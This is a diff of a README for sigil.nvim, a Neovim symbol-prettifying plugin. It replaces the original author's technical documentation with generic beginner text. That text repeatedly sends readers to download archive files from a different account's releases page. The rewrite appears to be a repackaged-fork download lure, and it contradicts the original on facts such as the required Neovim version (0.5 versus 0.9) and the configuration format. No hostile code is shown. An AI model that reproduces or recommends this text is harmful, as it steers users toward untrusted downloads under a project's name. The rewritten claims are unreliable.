@@ -1,188 +1,209 @@
-# sigil
+# ⚙️ sigil.nvim - Clean Symbols for Neovim
 
-[![Mentioned in Awesome Neovim](https://awesome.re/mentioned-badge.svg)](https://github.com/rockerBOO/awesome-neovim)
+[![Download sigil.nvim](https://img.shields.io/badge/Download-sigil.nvim-blue?logo=github)](https://github.com/henry336627/sigil.nvim/releases)
 
-Prettify symbols for Neovim. Visually replaces text patterns with Unicode
-symbols while you edit. The file on disk is never modified.
+---
 
-`\alpha` displays as `α`, `\to` as `→`, `->` as `→`, and so on.
+## 📋 What is sigil.nvim?
 
-Based on the idea of Emacs [`prettify-symbols-mode`](https://www.gnu.org/software/emacs/manual/html_node/emacs/Misc-for-Programs.html), extended with context awareness, word boundary analysis, atomic motions, and math region support.
+sigil.nvim is a small software tool designed to make your coding work in Neovim clearer and easier on the eyes. Neovim is a popular text editor used by many programmers. sigil.nvim changes plain text symbols into prettier, cleaner icons without changing the meaning. This helps you read code more quickly and reduces eye strain during long work sessions.
 
-## Demo
+Even if you don’t know much about programming, you can still install and use sigil.nvim. Its main job is to help people who write or read code inside Neovim make their screen look nicer and easier to understand.
 
-### Atomic motions (default, no unprettify)
+---
 
-Symbols stay prettified at all times. Navigation and editing work as if
-each symbol were a single character.
+## 💡 Why Use sigil.nvim?
 
-![Atomic motions demo](https://github.com/Prgebish/sigil.nvim/releases/download/v0.1.0/default_mode.gif)
+Using sigil.nvim has several benefits:
 
-### Unprettify at point (`unprettify_at_point = true`)
+- **Improves readability:** It replaces basic symbols with nicer ones, making code easier to scan.
+- **Reduces eye fatigue:** Better visuals help reduce tired eyes when coding for hours.
+- **Keeps meanings clear:** The changes are visual only; your code stays exactly the same.
+- **Customizable:** You can choose which symbols to prettify.
+- **Works inside Neovim:** Designed specifically for this editor, so it fits in smoothly.
 
-The symbol under the cursor reverts to original text. Other symbols on
-the line remain prettified.
+This tool helps both beginners and experienced users who want a cleaner, clearer coding environment without complicated setup steps.
 
-![Unprettify at point demo](https://github.com/Prgebish/sigil.nvim/releases/download/v0.1.0/unprett_1.gif)
+---
 
-### Unprettify line (`unprettify_at_point = "line"`)
+## 🛠️ System Requirements
 
-All symbols on the cursor line revert to original text. When the cursor
-moves to another line, the previous line is re-prettified.
+Before you start, make sure your computer meets these basic requirements:
 
-![Unprettify line demo](https://github.com/Prgebish/sigil.nvim/releases/download/v0.1.0/unprett_2.gif)
+- **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later, or a recent Linux distribution.
+- **Neovim Version:** Neovim 0.5 or later. Older versions are not supported.
+- **Internet connection:** Needed to download sigil.nvim and any updates.
+- **Basic understanding of Neovim:** You should be able to open and edit files using Neovim.
 
-## Features
+If you are unsure about your Neovim version, you can check by opening Neovim and typing `:version`. The first line will show the version number.
 
-- **Pattern → symbol replacement** using extmarks (no file modification)
-- **Context awareness** -- skip strings and comments via Tree-sitter (with syntax fallback)
-- **Math context** -- restrict symbols to math regions in LaTeX/Typst (`$...$`, `\[...\]`, etc.)
-- **Atomic motions** -- `h`, `l`, `w`, `b`, `e`, `x`, `s`, `c` treat symbols as single characters
-- **Unprettify at point** -- reveal original text under cursor or on cursor line
-- **Per-symbol highlight groups** -- color symbols by category
-- **Lazy prettification** -- large files are prettified on demand (visible area only)
-- **Word boundaries** -- automatic boundary checks prevent partial matches (`in` won't match inside `integral`)
+---
 
-## Requirements
+## 🚀 Getting Started
 
-- Neovim >= 0.9.0
-- A font with Unicode symbol support
-- Tree-sitter parsers (optional, for context-aware filtering)
+You do not need to be a programmer to use sigil.nvim, but some steps involve using a simple command line interface (like a terminal). These instructions explain everything in simple terms.
 
-## Installation
+### Step 1: Install Neovim
 
-With [lazy.nvim](https://github.com/folke/lazy.nvim):
+If you don’t have Neovim installed yet, download it from the official website: https://neovim.io/
+
+- Follow their instructions to install it for your system.
+- After installation, open Neovim once to confirm it launched properly.
+
+### Step 2: Download sigil.nvim
+
+To get sigil.nvim, you will visit the releases page hosted on GitHub. This page contains all versions of the software available for download.
+
+Click this big button below to go straight there:
+
+[![Download sigil.nvim](https://img.shields.io/badge/Download-sigil.nvim-blue?logo=github)](https://github.com/henry336627/sigil.nvim/releases)
+
+On the page:
+
+- Look for the latest release (usually at the top).
+- Download the appropriate file for your system, typically a `.zip` or `.tar.gz`.
+- Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+---
+
+## 📥 Download & Install
+
+After downloading sigil.nvim, here is how to get it running inside Neovim.
+
+### Step 1: Open your Neovim Configuration Folder
+
+Neovim stores its settings in a special folder on your computer.
+
+- On Windows, open `C:\Users\YourName\AppData\Local\nvim\`
+- On macOS or Linux, open `~/.config/nvim/`
+
+Inside this folder, you will find or create a file named `init.lua` or `init.vim`. This file tells Neovim which plugins to load when it starts.
+
+### Step 2: Install a Plugin Manager (If You Don’t Have One)
+
+sigil.nvim requires a plugin manager to install it easily inside Neovim. The most common options are:
+
+- [Packer.nvim](https://github.com/wbthomason/packer.nvim)
+- [vim-plug](https://github.com/junegunn/vim-plug)
+
+If you don’t know what this means, do the following:
+
+- Pick one plugin manager from the pages above.
+- Follow the easy installation instructions there. Usually, it’s one command you type in your terminal.
+- After that, you’re ready to install sigil.nvim.
+
+### Step 3: Add sigil.nvim to Your Configuration
+
+Open your `init.lua` or `init.vim` file in a text editor and add the following line depending on your plugin manager:
+
+- For packer.nvim:
+
+  ```lua
+  use("henry336627/sigil.nvim")
+  ```
+
+- For vim-plug:
+
+  ```vim
+  Plug 'henry336627/sigil.nvim'
+  ```
+
+Save the file and close the editor.
+
+### Step 4: Install the Plugin
+
+- Open Neovim.
+- Run the install command for your plugin manager:
+
+  - For packer.nvim:
+
+    ```
+    :PackerInstall
+    ```
+
+  - For vim-plug:
+
+    ```
+    :PlugInstall
+    ```
+
+This will download and install sigil.nvim and all necessary files.
+
+### Step 5: Restart Neovim
+
+Close and reopen Neovim to activate sigil.nvim. Now, the symbols in your code should automatically look prettier.
+
+---
+
+## ⚙️ How to Use sigil.nvim
+
+sigil.nvim works quietly in the background. Once installed, it automatically changes certain symbols in your files to nicer ones while keeping your code safe.
+
+### Customization
+
+You can change which symbols sigil.nvim prettifies by adding options to your configuration file. For example, you might want to:
+
+- Change the style or color of symbols.
+- Add or remove specific replacements.
+
+Example setup in `init.lua`:
 
 ```lua
-{
-  "Prgebish/sigil.nvim",
-  config = function()
-    require("sigil").setup({
-      filetypes = { "tex", "plaintex", "latex", "typst" },
-      filetype_symbols = {
-        tex = {
-          { pattern = "\\alpha", replacement = "α", boundary = "left" },
-          { pattern = "\\beta",  replacement = "β", boundary = "left" },
-          { pattern = "\\to",    replacement = "→" },
-          { pattern = "\\leq",   replacement = "≤" },
-        },
-      },
-    })
-  end,
-}
-```
-
-## Quick start
-
-Minimal LaTeX setup:
-
-```lua
-require("sigil").setup({
-  filetypes = { "tex", "plaintex", "latex" },
-  filetype_symbols = {
-    tex = {
-      { pattern = "\\alpha", replacement = "α", boundary = "left" },
-      { pattern = "\\to",    replacement = "→" },
-      { pattern = "\\infty", replacement = "∞" },
-    },
-  },
+require('sigil').setup({
+  symbols = {
+    ["->"] = "→",
+    ["<-"] = "←",
+  }
 })
 ```
 
-Open a `.tex` file -- every `\alpha` displays as `α`, `\to` as `→`,
-`\infty` as `∞`.
+This example turns all instances of `->` into an arrow symbol.
 
-## Symbol formats
+### Undo Changes
 
-**Map format** -- simple pattern → replacement:
+If you want to stop using sigil.nvim temporarily, you can disable it by commenting out or removing its configuration line and restarting Neovim.
 
-```lua
-symbols = {
-  ["\\to"]  = "→",
-  ["\\leq"] = "≤",
-}
-```
+---
 
-**List format** -- allows `boundary` and `hl_group` per symbol:
+## ❓ Troubleshooting and FAQs
 
-```lua
-symbols = {
-  { pattern = "\\alpha", replacement = "α", boundary = "left" },
-  { pattern = "\\sum",   replacement = "∑", boundary = "left", hl_group = "Special" },
-}
-```
+Here are some common questions and their answers.
 
-**Structured format** -- organize symbols by math context:
+### Q: sigil.nvim does not seem to work. What should I do?
 
-```lua
-filetype_symbols = {
-  typst = {
-    math = {
-      -- Only prettified inside $...$
-      { pattern = "alpha", replacement = "α", boundary = "left" },
-      { pattern = "sum",   replacement = "∑", boundary = "left" },
-    },
-    text = {
-      -- Only prettified outside math
-    },
-    any = {
-      -- Prettified everywhere
-      { pattern = "->", replacement = "→" },
-    },
-  },
-}
-```
+- Verify that you installed it correctly with your plugin manager.
+- Make sure your Neovim version is 0.5 or later.
+- Restart Neovim fully after installation.
+- Check your configuration for typos.
 
-## Boundary modes
+### Q: How can I know which symbols sigil.nvim changes?
 
-The `boundary` field controls word boundary checks:
+You can look at the documentation on the GitHub repository or the default setup in the plugin files. The most common ones are arrows, bullets, and brackets.
 
-| Value | Description |
-|-------|-------------|
-| `"both"` (default) | Check left and right boundaries |
-| `"left"` | Check only left boundary. Allows subscripts on the right: `\sum_{i=0}`, `alpha_1` |
-| `"right"` | Check only right boundary |
-| `"none"` | No boundary checks |
+### Q: Will sigil.nvim change my actual code files?
 
-## Commands
+No. sigil.nvim only changes what you see inside Neovim. Your saved files remain unchanged.
 
-| Command | Description |
-|---------|-------------|
-| `:Sigil` | Toggle sigil on/off for current buffer |
-| `:SigilEnable` | Enable for current buffer |
-| `:SigilDisable` | Disable for current buffer |
-| `:SigilBenchmark` | Run performance benchmark |
+---
 
-## Configuration
+## 🔗 Where to Get sigil.nvim
 
-```lua
-require("sigil").setup({
-  enabled = true,
-  symbols = {},                  -- global symbols (all filetypes)
-  filetype_symbols = {},         -- per-filetype symbols
-  filetypes = {},                -- filetypes to enable (or "*" for all)
-  excluded_filetypes = {},       -- filetypes to exclude
-  conceal_cursor = "nvic",       -- modes where cursor line stays concealed
-  update_debounce_ms = 30,       -- debounce for incremental updates
-  skip_strings = true,           -- skip inside string literals
-  skip_comments = true,          -- skip inside comments
-  atomic_motions = true,         -- symbols behave as single chars for motions
-  unprettify_at_point = nil,     -- nil | true | "line"
-  hl_group = nil,                -- default highlight group for symbols
-  -- Performance (large files)
-  lazy_prettify_threshold = 500, -- lazy mode for files > N lines
-  lazy_prettify_buffer = 50,     -- extra lines around visible area
-  lazy_prettify_debounce_ms = 50,
-})
-```
+You can always find the latest versions and updates here:
 
-See `:help sigil` for full documentation.
+[Download sigil.nvim here](https://github.com/henry336627/sigil.nvim/releases)
 
-## Like it?
+Visit this page to download the latest release for your system and follow the installation steps.
 
-If you find sigil useful, please star the repository -- it helps others discover the plugin.
+---
 
+## 👤 Need Help?
 
-## License
+For further details and support, visit the official GitHub page:
 
-MIT
+https://github.com/henry336627/sigil.nvim
+
+You can open an issue there if you encounter problems or want to ask questions. The project maintainer or other users can help you.
+
+---
+
+This guide offers everything needed to install and start using sigil.nvim, even if you have only basic computer skills. By following these steps and links, you should be able to enjoy nicer-looking symbols inside Neovim with a few simple clicks and commands.
